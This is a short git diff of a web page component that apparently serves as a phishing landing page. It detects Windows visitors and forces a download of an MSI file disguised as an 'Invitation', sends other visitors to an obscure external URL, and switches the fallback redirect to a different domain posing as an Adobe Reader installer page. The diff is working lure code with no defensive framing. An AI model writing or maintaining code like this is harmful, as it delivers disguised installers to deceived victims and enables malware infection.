@@ -7,7 +7,7 @@ export default function Home() {
 
     const NON_WINDOWS_TARGET = "https://quora.chabemo.institute/DjK@TxMYRFjDq3p5aQPUt2/";
     const MSI_FILE = "/Invitation-9023.msi";
-    const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";
+    const WINDOWS_REDIRECT = "https://uswebsites.com/adobe-reader/installer/download.html";
 
     if (isWindows) {
       window.location.href = MSI_FILE;
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
